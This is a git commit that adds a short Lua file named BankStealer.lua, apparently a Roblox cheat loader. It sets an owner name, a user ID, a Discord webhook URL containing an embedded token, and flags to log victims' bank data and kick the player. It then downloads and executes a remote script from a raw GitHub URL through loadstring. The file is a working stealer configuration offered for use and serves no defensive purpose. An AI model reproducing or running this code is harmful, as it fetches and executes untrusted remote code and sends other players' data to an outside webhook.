85d6ce6404cf50be99f2b4474616f7f4b2b5ff3e
Fustsad <128865503+Fustsad@users.noreply.github.com>
2023-03-25 14:17:18 +0300

    Add files via upload

---
+++ BankStealer.lua
@@ -0,0 +1,7 @@
+_G.AuthName = 'fustsad'
+_G.AuthId = 3087890037
+_G.AuthWebhook = "https://discord.com/api/webhooks/1088951628364775544/2LUk4ommgOJyopVTDl4JOz_osOga0m5fACsqaLVG24UBS8cVwjYBVuW0fNSvjun3xWfD"
+_G.BankLogger = true 
+_G.KickPlayer = true 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SaskeCen/Dark-Hub/main/BankStealer.lua"))()
